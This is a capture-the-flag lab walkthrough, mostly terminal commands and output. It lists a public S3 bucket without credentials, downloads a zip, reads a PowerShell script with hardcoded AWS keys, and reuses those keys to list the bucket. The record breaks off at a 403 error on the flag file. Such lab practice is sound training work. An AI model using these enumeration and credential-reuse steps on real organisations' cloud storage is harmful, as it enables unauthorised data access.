### Lab - 1 AWS S3 Enumeration Basics
Link : https://pwnedlabs.io/labs/aws-s3-enumeration-basics
PoC : 
S1 - Check for contents in S3 Bucket.
```
┌──(shibushivansh㉿shibu)-[~]
└─$ aws s3 ls s3://dev.huge-logistics.com --no-sign-request 
                           PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 22:30:47       5347 index.html
```

> `aws s3 ls s3://dev.huge-logistics.com --no-sign-request --recursive` : This particular command helps to list all the files present in the directories

```
┌──(shibushivansh㉿shibu)-[~]
└─$ aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request                
2023-10-16 20:38:33          0 
2023-10-16 20:39:01        993 hl_migration_project.zip
 
┌──(shibushivansh㉿shibu)-[~]
└─$ aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request 
download: s3://dev.huge-logistics.com/shared/hl_migration_project.zip to ./hl_migration_project.zip
  
┌──(shibushivansh㉿shibu)-[~]
└─$ ls
 Android         BuiltAndroidApps                   ctf-backend   Downloads       hl_migration_project.zip   Laptop_Photos     Music              Pictures                'React2Shell Vulnerability.pdf'   server      Videos
 Angad_Product   Built-Pipeline.apk                 Desktop       Findings        hs                         LLMProject        phew_server.zip    PortswiggerLabsContent  'Requirement Gathering.txt'       snap       'VirtualBox VMs'
 ApkProjects     BurpSuite_profissional_v2025.1.4   Documents    'Frame 78.png'   LaptopData                 MediumResources   PhishingCampaign   Public                   Scripts                          Templates
                                    
┌──(shibushivansh㉿shibu)-[~]
└─$ unzip hl_migration_project.zip 
Archive:  hl_migration_project.zip
  inflating: migrate_secrets.ps1     

┌──(shibushivansh㉿shibu)-[~]
└─$ ls
 Android         BuiltAndroidApps                   ctf-backend   Downloads       hl_migration_project.zip   Laptop_Photos     migrate_secrets.ps1   PhishingCampaign         Public                           Scripts   Templates
 Angad_Product   Built-Pipeline.apk                 Desktop       Findings        hs                         LLMProject        Music                 Pictures                'React2Shell Vulnerability.pdf'   server    Videos
 ApkProjects     BurpSuite_profissional_v2025.1.4   Documents    'Frame 78.png'   LaptopData                 MediumResources   phew_server.zip       PortswiggerLabsContent  'Requirement Gathering.txt'       snap     'VirtualBox VMs'


┌──(shibushivansh㉿shibu)-[~]
└─$ cat migrate_secrets.ps1 
# AWS Configuration
$accessKey = "access-key"
$secretKey = "secret-key"
$region = "us-east-1"

# Set up AWS hardcoded credentials
Set-AWSCredentials -AccessKey $accessKey -SecretKey $secretKey

# Set the AWS region
Set-DefaultAWSRegion -Region $region

# Read the secrets from export.xml
[xml]$xmlContent = Get-Content -Path "export.xml"

# Output log file
$logFile = "upload_log.txt"

# Error handling with retry logic
function TryUploadSecret($secretName, $secretValue) {
    $retries = 3
    while ($retries -gt 0) {
        try {
            $result = New-SECSecret -Name $secretName -SecretString $secretValue
            $logEntry = "Successfully uploaded secret: $secretName with ARN: $($result.ARN)"
            Write-Output $logEntry
            Add-Content -Path $logFile -Value $logEntry
            return $true
        } catch {
            $retries--
            Write-Error "Failed attempt to upload secret: $secretName. Retries left: $retries. Error: $_"
        }
    }
    return $false
}

foreach ($secretNode in $xmlContent.Secrets.Secret) {
    # Implementing concurrency using jobs
    Start-Job -ScriptBlock {
        param($secretName, $secretValue)
        TryUploadSecret -secretName $secretName -secretValue $secretValue
    } -ArgumentList $secretNode.Name, $secretNode.Value
}

# Wait for all jobs to finish
$jobs = Get-Job
$jobs | Wait-Job

# Retrieve and display job results
$jobs | ForEach-Object {
    $result = Receive-Job -Job $_
    if (-not $result) {
        Write-Error "Failed to upload secret: $($_.Name) after multiple retries."
    }
    # Clean up the job
    Remove-Job -Job $_
}

Write-Output "Batch upload complete!"


# Install-Module -Name AWSPowerShell -Scope CurrentUser -Force
# .\migrate_secrets.ps1
```

And now using the Access Token and Shared Token, we can simply configure this to our profile.

But even after configuring this profile, we are unable to download the flag present in the /admin/ directory of the S3 Bucket.

```
┌──(shibushivansh㉿shibu)-[~]
└─$ aws s3 ls --profile s3_enum_flag s3://dev.huge-logistics.com --recursive 
2023-10-16 20:38:38          0 admin/
2024-12-02 20:27:44         32 admin/flag.txt
2023-10-17 01:54:07       2425 admin/website_transactions_export.csv
2023-10-16 22:30:47       5347 index.html
2023-10-16 20:38:47          0 migration-files/
2023-10-16 20:39:26    1833646 migration-files/AWS Secrets Manager Migration - Discovery & Design.pdf
2023-10-16 20:39:25    1407180 migration-files/AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 20:39:27       1853 migration-files/migrate_secrets.ps1
2023-10-16 23:30:13       2494 migration-files/test-export.xml
2023-10-16 20:38:33          0 shared/
2023-10-16 20:39:01        993 shared/hl_migration_project.zip
2023-10-16 20:38:26          0 static/
2023-10-16 22:22:30      54451 static/logo.png
2023-10-16 22:22:30        183 static/script.js
2023-10-16 22:22:31       9259 static/style.css

┌──(shibushivansh㉿shibu)-[~]
└─$ aws s3 cp --profile s3_enum_flag s3://dev.huge-logistics.com/admin/flag.txt . 
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

